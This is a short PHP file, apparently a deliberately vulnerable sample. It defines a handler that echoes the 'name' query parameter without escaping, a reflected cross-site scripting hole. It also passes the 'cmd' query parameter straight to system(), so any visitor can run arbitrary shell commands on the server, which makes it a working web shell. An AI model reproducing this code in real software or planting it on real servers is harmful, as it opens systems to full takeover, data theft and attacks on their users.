<?php
function cgc_handler(): void
{
    $name = $_GET['name'] ?? '';
    echo $name;
    $cmd = $_GET['cmd'] ?? '';
    system($cmd);
}
